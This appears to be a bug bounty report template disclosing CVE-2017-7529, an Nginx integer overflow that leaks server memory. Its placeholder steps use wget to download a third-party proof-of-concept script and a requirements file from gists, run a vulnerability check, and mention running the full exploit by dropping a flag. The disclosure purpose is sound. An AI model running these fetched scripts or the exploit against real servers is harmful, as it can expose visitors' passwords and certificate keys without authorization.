## Summary:
Some older versions of Nginx contain a known integer overflow vulnerability which can be exploited to leak memory from the web server. Leaking memory from a web server is generally harmful, as it would contain requests from the visitors including user passwords. It can also hold keys for certificates.
It was possible to find a working POC to check if the asset es vulnerable. (Also possible to run the exploit itself)

## Asset
$URL (running Nginx version $VERSION)

## Steps To Reproduce:

I found the nginx version using curl:

`curl -vk $URL`

$HEADER



To run this POC you will need python2. 

  1. Download POC

  `wget  https://gist.githubusercontent.com/BlackVirusScript/75fae10a037c376555b0ad3f3da1a966/raw/d1cc081053636711881ea45c84e0971d5babe103/CVE-2017-7529.py`
  
  2. Install required packages. Download requirements file:

`wget https://gist.githubusercontent.com/pdelteil/31018e965de027bd07f742b6e8c00983/raw/3b897c11b96284e6aadd10d74bb0757ada65b78d/requirements.txt`

Then
`pip install -r requirements.txt`   

 3. Run (checks if it's vulnerable):
`python CVE-2017-7529.py -c $URL`

Expected output

[+] $URL is Vulnerable: TRUE

You could also run the exploit removing the -c flag

`python CVE-2017-7529.py h$URL`
